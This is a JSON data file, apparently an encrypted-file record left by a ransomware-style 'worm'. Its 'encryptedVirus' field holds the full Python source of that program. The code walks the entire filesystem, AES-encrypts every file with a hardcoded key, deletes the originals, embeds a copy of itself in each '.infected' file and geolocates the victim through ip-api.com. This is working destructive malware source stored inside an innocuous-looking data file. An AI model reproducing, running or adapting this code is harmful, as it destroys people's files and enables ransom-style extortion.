{
  "checksum": "9dc1e3d6a047ba8dd7a12d262ced3ef73f18e6e45251cfd5429250155cfc041bfe4e5ea8124d11e59c5a7116e1e6202198b354316a2cf8b7579a34de68d077d0",
  "iv": [
    "0x1.98843d1cd534ep+30",
    "mysecretpassword"
  ],
  "fileData": "two, 2",
  "encryptedVirus": [
    "0x1.98843d1cd534ep+30",
    "import os\r\nimport sys\r\nimport time\r\nimport json\r\nimport socket\r\nimport base64\r\nimport requests\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Hash import SHA512\r\nfrom Crypto.Util.Padding import pad, unpad\r\nfrom dataclasses import dataclass, field, asdict\r\n\r\nos.chmod(sys.argv[0], 777)\r\necho = open(sys.argv[0], 'rb').read()\r\n\r\n\r\n@dataclass\r\nclass WormConfig:\r\n    key: bytes = field(default=b\"mysecretpassword\")\r\n    scan: str = field(default=\"C:\\\\\" if sys.platform.startswith('win') else \"/\")\r\n    ip_local: str = field(default=socket.gethostbyname(socket.gethostname()))\r\n    ip_resolver: str = field(default=\"http://ip-api.com/json\")\r\n    def __repr__(self): return \"<WormConfig %r>\" % asdict(self)\r\n\r\n    def __init__(self):\r\n        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), \".wormconfig\"), \"r\") as conf:\r\n            for line in conf.readlines():\r\n                k, v = line.replace('\\n', '').split(' ')\r\n                if 'key' in k and 'default' not in v:\r\n                    self.key = v\r\n                elif 'scan' in k and 'default' not in v:\r\n                    self.scan = v\r\n                elif 'ip_local' in k and 'default' not in v:\r\n                    self.ip_local = v\r\n                elif 'ip_resolver' in k and 'default' not in v:\r\n                    self.ip_resolver = v\r\n\r\n\r\n@dataclass\r\nclass WormDigest(WormConfig):\r\n    cipher: AES = field(default=AES.new(WormConfig.key, AES.MODE_ECB))\r\n    virus_data: bytes = field(default=echo)\r\n    @staticmethod\r\n    def ChecksumSHA512(data): return SHA512.new(data).hexdigest()\r\n\r\n    def __init__(self):\r\n        super(WormDigest, self).__init__()\r\n\r\n    def EncodeAES(self, plaintext):\r\n        if isinstance(plaintext, str):\r\n            plaintext = plaintext.encode('utf-8')\r\n        return base64.urlsafe_b64encode(self.cipher.encrypt(\r\n                pad(\r\n                    plaintext, AES.block_size\r\n                )\r\n            )\r\n        ).decode('utf-8')\r\n\r\n    def DecodeAES(self, ciphertext):\r\n        if isinstance(ciphertext, str):\r\n            ciphertext = ciphertext.encode()\r\n        return unpad(\r\n                self.cipher.decrypt(\r\n                    base64.urlsafe_b64decode(ciphertext)\r\n                ), AES.block_size\r\n            ).decode('utf-8')\r\n\r\n\r\n@dataclass\r\nclass INET:\r\n    public_ip: str = field(default=str)\r\n    private_ip: str = field(default=str)\r\n    bridges: list = field(default=list)\r\n    last_refresh: float = field(init=False, default=float)\r\n    def __repr__(self): return \"<INET %r>\" % asdict(self)\r\n    def __init__(self): self.refresh()\r\n\r\n    def refresh(self):\r\n        self.private_ip = socket.gethostbyname(socket.gethostname())\r\n        self.bridges = socket.gethostbyname_ex(socket.gethostname())[2]\r\n        self.last_refresh = time.time()\r\n        return self\r\n\r\n\r\n@dataclass\r\nclass GeoIP:\r\n    country: str = field(init=False)\r\n    countryCode: str = field(init=False)\r\n    region: str = field(init=False)\r\n    regionName: str = field(init=False)\r\n    city: str = field(init=False)\r\n    zip: str = field(init=False)\r\n    lat: float = field(init=False)\r\n    lon: float = field(init=False)\r\n    timezone: str = field(init=False)\r\n    isp: str = field(init=False)\r\n    AS: str = field(init=False)\r\n    query: str = field(init=False)\r\n    last_refresh: float = field(init=False, default=float)\r\n    def __repr__(self): return \"<GeoIP %r>\" % asdict(self)\r\n    def __init__(self): self.refresh()\r\n\r\n    def refresh(self):\r\n        data = requests.get('http://ip-api.com/json')\r\n        for k, v in data.json().items():\r\n            if k == 'as':\r\n                self.AS = v\r\n            else:\r\n                setattr(self, k, v)\r\n        self.last_refresh = time.time()\r\n        return self\r\n\r\n\r\n@dataclass\r\nclass Host:\r\n    os_name: str = field(default=os.name)\r\n    platform: str = field(default=sys.platform)\r\n    id: str = field(init=False, default=str)\r\n    last_refresh: float = field(init=False, default=float)\r\n    geoip: GeoIP = field(default=GeoIP)\r\n    inet: INET = field(default=INET)\r\n    crypto: WormDigest = field(default=WormDigest)\r\n    fs_scan_list: list = field(default=list)\r\n    locked_file_list: list = field(default=list)\r\n    def __repr__(self): return \"<Host %r>\" % asdict(self)\r\n    def __init__(self): self.id = hex(id(self))\r\n\r\n    def refresh(self):\r\n        self.crypto = WormDigest()\r\n        self.geoip = GeoIP()\r\n        self.inet = INET()\r\n        self.inet.public_ip = self.geoip.query\r\n        self.os_name = os.name\r\n        self.platform = sys.platform\r\n        self.last_refresh = time.time()\r\n        self.fs_scan_list = []\r\n        self.locked_file_list = []\r\n        for root, dirs, files in os.walk(self.crypto.scan):\r\n            for file in files:\r\n                self.fs_scan_list.append(os.path.join(root, file))\r\n        return self\r\n\r\n    def encrypt(self, delimiter=\"|:|\", suffix=\".infected\"):\r\n        for file in self.fs_scan_list:\r\n            with open(file, 'rb') as fin:\r\n                data_read = fin.read()\r\n                encrypted_data = {\r\n                    \"checksum\": self.crypto.ChecksumSHA512(data_read),\r\n                    \"fileData\": self.crypto.EncodeAES(data_read),\r\n                    \"encryptedVirus\": self.crypto.EncodeAES(\r\n                        self.crypto.EncodeAES(\r\n                            time.time().hex().encode()\r\n                        ) + delimiter + self.crypto.EncodeAES(self.crypto.virus_data)\r\n                    ),\r\n                    \"iv\": self.crypto.EncodeAES(self.crypto.EncodeAES(\r\n                        time.time().hex().encode()\r\n                    ) + delimiter + self.crypto.EncodeAES(self.crypto.key))\r\n                }\r\n            with open(file+suffix, 'w') as fout:\r\n                json.dump(encrypted_data, fout, indent=2)\r\n                os.remove(file)\r\n                self.locked_file_list.append(file+suffix)\r\n        return self\r\n\r\n    def decrypt(self, delimiter=\"|:|\", clean_tag=\".clean\", infected_tag=\".infected\"):\r\n        if clean_tag in self.crypto.scan:\r\n            sys.stdout.write(\"[!] clean files cannot be decrypted again [!]\")\r\n            sys.exit(0)\r\n        if os.path.isdir(self.crypto.scan):\r\n            for root, dirs, files in os.walk(self.crypto.scan):\r\n                for name in files:\r\n                    if name.endswith(infected_tag):\r\n                        with open(os.path.join(root, name), \"rb\") as fin:\r\n                            encrypted_data = json.load(fin)\r\n                            obj = {\r\n                                \"checksum\": encrypted_data[\"checksum\"],\r\n                                \"iv\": [self.crypto.DecodeAES(i) for i in\r\n                                       self.crypto.DecodeAES(encrypted_data[\"iv\"]).split(delimiter)],\r\n                                \"fileData\": self.crypto.DecodeAES(encrypted_data[\"fileData\"]),\r\n                                \"encryptedVirus\": [self.crypto.DecodeAES(i) for i in\r\n                                                   self.crypto.DecodeAES(encrypted_data[\"encryptedVirus\"]).split(\r\n                                                       delimiter)]\r\n                            }\r\n                        with open(os.path.join(root, name+clean_tag), \"w\") as fout:\r\n                            json.dump(obj, fout, indent=2)\r\n                        os.remove(os.path.join(root, name))\r\n        else:\r\n            with open(self.crypto.scan, 'rb') as fin:\r\n                encrypted_data = json.load(fin)\r\n                obj = {\r\n                    \"checksum\": encrypted_data[\"checksum\"],\r\n                    \"iv\": [self.crypto.DecodeAES(i) for i in\r\n                           self.crypto.DecodeAES(encrypted_data[\"iv\"]).split(delimiter)],\r\n                    \"fileData\": self.crypto.DecodeAES(encrypted_data[\"fileData\"]),\r\n                    \"encryptedVirus\": [self.crypto.DecodeAES(i) for i in\r\n                                       self.crypto.DecodeAES(encrypted_data[\"encryptedVirus\"]).split(delimiter)]\r\n                }\r\n            with open(os.path.join(self.crypto.scan+clean_tag), \"w\") as fout:\r\n                json.dump(obj, fout, indent=2)\r\n            os.remove(self.crypto.scan)\r\n            return obj\r\n\r\n\r\n\r\n\r\ndef run(args):\r\n    host = Host()\r\n    host.refresh()\r\n    if args.encrypt:\r\n        host.crypto.scan = args.encrypt\r\n        sys.stdout.write(\"[ENCRYPTING]\")\r\n        host.encrypt()\r\n        sys.exit(0)\r\n    if args.decrypt and args.key:\r\n        host.crypto.scan = args.decrypt\r\n        host.crypto.key = args.key.encode()\r\n        sys.stdout.write(\"[DECRYPTING]\")\r\n        host.decrypt()\r\n        sys.exit(0)\r\n\r\n\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    from argparse import ArgumentParser\r\n    parser = ArgumentParser()\r\n    parser.add_argument(\"-e\", \"--encrypt\", type=str, help=\"-e <FILE_PATH>\")\r\n    parser.add_argument(\"-d\", \"--decrypt\", type=str, help=\"-d <FILE_PATH>\")\r\n    parser.add_argument(\"-k\", \"--key\", type=str, help=\"-k <DECRYPTION_KEY>\")\r\n    args = parser.parse_args()\r\n    run(args)"
  ]
}